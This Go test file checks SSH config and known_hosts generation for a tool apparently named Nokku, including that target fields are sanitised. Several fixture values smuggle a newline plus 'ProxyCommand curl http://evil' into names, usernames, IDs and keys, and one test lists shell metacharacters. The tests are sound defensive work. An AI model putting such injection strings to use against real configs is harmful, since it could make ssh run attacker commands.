package ssh

import (
	"os"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/nokku-sh/nk/internal/paths"
	"github.com/nokku-sh/nk/internal/state"
)

func TestGenerateSSHConfig(t *testing.T) {
	setupSSHDir(t)
	st := &state.State{
		Targets: []state.Target{
			{
				ID:        "t-1",
				Name:      "prod",
				CAID:      "ca-1",
				Usernames: []string{"alice"},
			},
			{
				ID:        "t-2",
				Name:      "staging",
				CAID:      "ca-2",
				Usernames: []string{"bob"},
			},
			// Incomplete targets must be skipped.
			{
				ID:        "t-3",
				Name:      "no-ca",
				CAID:      "",
				Usernames: []string{"c"},
			},
			{ID: "t-4", Name: "no-principals", CAID: "ca-3"},
			{ID: "t-5", Name: "", CAID: "ca-3", Usernames: []string{"e"}},
		},
	}

	require.NoError(t, GenerateSSHConfig(st))

	content, err := os.ReadFile(paths.SSHConfigFile())
	require.NoError(t, err)

	certPath, err := paths.SSHCertificate("ca-1")
	require.NoError(t, err)

	for _, want := range []string{
		"# Managed by Nokku\n",
		"Host prod\n",
		"    User alice\n",
		"    ProxyCommand nk proxy %h %p\n",
		"    CertificateFile " + certPath + "\n",
		"    IdentityFile " + paths.PubKeyFile() + "\n",
		"    IdentityAgent " + paths.AgentSocket() + "\n",
		"    HostKeyAlias t-1\n",
		"    IdentitiesOnly yes\n",
		"    PasswordAuthentication no\n",
		"    StrictHostKeyChecking yes\n",
		"    ConnectTimeout 30\n",
		"Host staging\n",
		"    User bob\n",
	} {
		assert.Contains(t, string(content), want)
	}
	for _, forbidden := range []string{"no-ca", "no-principals", "t-3", "t-4"} {
		assert.NotContains(t, string(content), forbidden)
	}
}

func TestGenerateSSHConfigTPMIdentity(t *testing.T) {
	setupSSHDir(t)
	// A TPM identity is detected by the absence of a private key file while
	// the public key exists. ssh then uses the agent for the private key.
	require.NoError(t, os.WriteFile(paths.PubKeyFile(), []byte("ssh-ed25519 AAAA\n"), 0o600))

	st := &state.State{
		Targets: []state.Target{
			{
				ID:        "t-1",
				Name:      "prod",
				CAID:      "ca-1",
				Usernames: []string{"alice"},
			},
		},
	}
	require.NoError(t, GenerateSSHConfig(st))

	content, err := os.ReadFile(paths.SSHConfigFile())
	require.NoError(t, err)
	assert.Contains(t, string(content), "    IdentityFile "+paths.PubKeyFile()+"\n",
		"TPM identity must point IdentityFile at the public key")
	assert.Contains(t, string(content), "    IdentityAgent "+paths.AgentSocket()+"\n",
		"TPM identity must set IdentityAgent")
}

func TestGenerateSSHConfigDisambiguatesDuplicateNames(t *testing.T) {
	setupSSHDir(t)
	st := &state.State{
		Workspaces: []state.Workspace{
			{ID: "ws-1", Name: "staging"},
			{ID: "ws-2", Name: "production"},
		},
		Targets: []state.Target{
			{ID: "t-1", Name: "db", WorkspaceID: "ws-1", CAID: "ca-1",
				Usernames: []string{"alice"}},
			{ID: "t-2", Name: "db", WorkspaceID: "ws-2", CAID: "ca-2",
				Usernames: []string{"bob"}},
			{ID: "t-3", Name: "unique", WorkspaceID: "ws-1", CAID: "ca-1",
				Usernames: []string{"carol"}},
		},
	}

	require.NoError(t, GenerateSSHConfig(st))
	content, err := os.ReadFile(paths.SSHConfigFile())
	require.NoError(t, err)

	assert.Contains(t, string(content), "Host staging/db\n",
		"expected workspace-qualified host for duplicate name")
	assert.Contains(t, string(content), "Host production/db\n",
		"expected workspace-qualified host for duplicate name")
	assert.Contains(t, string(content), "Host unique\n",
		"expected bare host for unique name")
	assert.NotContains(t, string(content), "\nHost db\n",
		"duplicate bare name must not be emitted")
}

func TestGenerateSSHConfigRejectsControlCharacters(t *testing.T) {
	setupSSHDir(t)
	st := &state.State{
		Targets: []state.Target{
			{
				ID:        "t-1",
				Name:      "prod\n    ProxyCommand curl http://evil",
				CAID:      "ca-1",
				Usernames: []string{"alice"},
			},
			{
				ID:   "t-2",
				Name: "ok",
				CAID: "ca-1",
				Usernames: []string{
					"alice\n    ProxyCommand curl http://evil2",
				},
			},
			{
				ID:        "t-3",
				Name:      "ca-injection",
				CAID:      "ca-1\n    ProxyCommand curl http://evil3",
				Usernames: []string{"alice"},
			},
			{
				ID:        "t-4\n    ProxyCommand curl http://evil4",
				Name:      "id-injection",
				CAID:      "ca-1",
				Usernames: []string{"alice"},
			},
		},
	}

	require.NoError(t, GenerateSSHConfig(st))
	content, err := os.ReadFile(paths.SSHConfigFile())
	require.NoError(t, err)

	for _, forbidden := range []string{"curl http://evil", "evil2", "ProxyCommand"} {
		assert.NotContains(t, string(content), forbidden,
			"injected content reached the generated config")
	}
}

func TestGenerateKnownHosts(t *testing.T) {
	setupSSHDir(t)
	st := &state.State{
		CAs: []state.CA{
			{ID: "ca-1", Name: "Production CA", PublicKey: "ssh-ed25519 AAAACa1== production"},
			{ID: "ca-2", Name: "Staging CA", PublicKey: "  ssh-rsa AAAACa2== staging\n"},
		},
		Targets: []state.Target{
			{ID: "t-1", Name: "prod", CAID: "ca-1", DaemonID: "d-1"},
			{ID: "t-2", Name: "stage", CAID: "ca-2", DaemonID: "d-2"},
			{ID: "t-3", Name: "no-ca", DaemonID: "d-3"},
			{ID: "t-4", Name: "orphan", CAID: "ca-missing", DaemonID: "d-4"},
			// A manual target presents its own host key, so it is pinned by
			// that raw key and never by the CA.
			{ID: "t-5", Name: "manual", CAID: "ca-1", HostPublicKey: "ssh-ed25519 AAAAhost== host"},
			// A manual target with no reported host key has nothing to pin.
			{ID: "t-6", Name: "manual-keyless", CAID: "ca-1"},
			// A daemon target's host key comes from a certificate, so a
			// reported raw key must not become a pin.
			{ID: "t-7", Name: "daemon-keyed", CAID: "ca-1", DaemonID: "d-7",
				HostPublicKey: "ssh-ed25519 AAAAstray== host"},
		},
	}

	require.NoError(t, GenerateKnownHosts(st))
	content, err := os.ReadFile(paths.KnownHostsPath())
	require.NoError(t, err)

	// Trust is scoped to the target ID (the HostKeyAlias in the generated
	// config), never a global "*".
	assert.Contains(t, string(content), "@cert-authority t-1 ssh-ed25519 AAAACa1== production\n")
	assert.Contains(t, string(content), "@cert-authority t-2 ssh-rsa AAAACa2== staging\n")
	assert.Contains(t, string(content), "t-5 ssh-ed25519 AAAAhost== host\n")
	assert.NotContains(t, string(content), "@cert-authority t-5",
		"a manual target must not be trusted through the CA")
	assert.NotContains(t, string(content), "@cert-authority *",
		"known_hosts must not trust a CA for every host")
	assert.NotContains(t, string(content), "AAAAstray",
		"a daemon target must not be pinned by a raw host key")
	assert.NotContains(t, string(content), "t-6",
		"target without a reported host key must not get a known_hosts line")
	assert.NotContains(t, string(content), "t-3",
		"target without a CA must not get a known_hosts line")
	assert.NotContains(t, string(content), "t-4",
		"target with an unknown CA must not get a known_hosts line")
}

// TestGenerateKnownHostsRejectsInjectedKeys covers the known_hosts sinks: the
// CA public key and the reported host key are multi-word fields, so a newline
// in either would start a new line in a file OpenSSH parses.
func TestGenerateKnownHostsRejectsInjectedKeys(t *testing.T) {
	setupSSHDir(t)
	st := &state.State{
		CAs: []state.CA{
			{ID: "ca-1", PublicKey: "ssh-ed25519 AAAACA==\nHost *\n    ProxyCommand curl http://evil"},
		},
		Targets: []state.Target{
			{ID: "t-1", Name: "prod", CAID: "ca-1", DaemonID: "d-1"},
			{ID: "t-2", Name: "manual", CAID: "ca-1",
				HostPublicKey: "ssh-ed25519 AAAAhost==\nHost *\n    ProxyCommand curl http://evil2"},
		},
	}

	require.NoError(t, GenerateKnownHosts(st))
	content, err := os.ReadFile(paths.KnownHostsPath())
	require.NoError(t, err)

	for _, forbidden := range []string{"curl http://evil", "ProxyCommand", "Host *"} {
		assert.NotContains(t, string(content), forbidden,
			"injected content reached known_hosts")
	}
}

func TestSafeConfigToken(t *testing.T) {
	for _, ok := range []string{"prod", "prod-us-1", "staging", "ünïcode", "db.prod_1"} {
		assert.True(t, safeConfigToken(ok), "safeConfigToken(%q) = false, want true", ok)
	}
	for _, bad := range []string{
		"a\nb", "a\rb", "a\tb", "a\x00b", "a\x1bb", "a\x7fb",
		"my host", "a#b", "",
		// Wildcards would widen a Host or known_hosts pattern.
		"*", "a?b", "[a-z]", "a!b",
		// Shell metacharacters.
		"a;b", "a&b", "a|b", "a$b", "a`b", "a'b", `a"b`, "a(b)",
		"a{b}", "a<b", "a~b", `a\b`, "a>b",
	} {
		assert.False(t, safeConfigToken(bad), "safeConfigToken(%q) = true, want false", bad)
	}
}
